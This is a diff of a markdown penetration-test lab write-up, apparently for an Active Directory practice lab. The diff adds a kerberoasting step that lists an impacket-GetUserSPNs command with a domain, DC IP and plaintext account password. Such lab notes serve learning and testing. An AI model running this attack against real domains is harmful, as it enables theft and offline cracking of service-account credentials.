@@ -27,4 +27,11 @@ I tried LDAP enumeration with the `jeor.mormont` account, we get a lot of stuff.
 ```  
 
 
-We can also try kerberoasting on 
+
+We can also try kerberoasting on `samwell.tarly` or `jeor.mormont` account. We get the same result from both.
+
+```bash
+  impacket-GetUserSPNs -request -dc-ip 10.2.10.11 \
+      'north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_'
+```
+  ![[images/2026-10-07_14-36-17.png]]
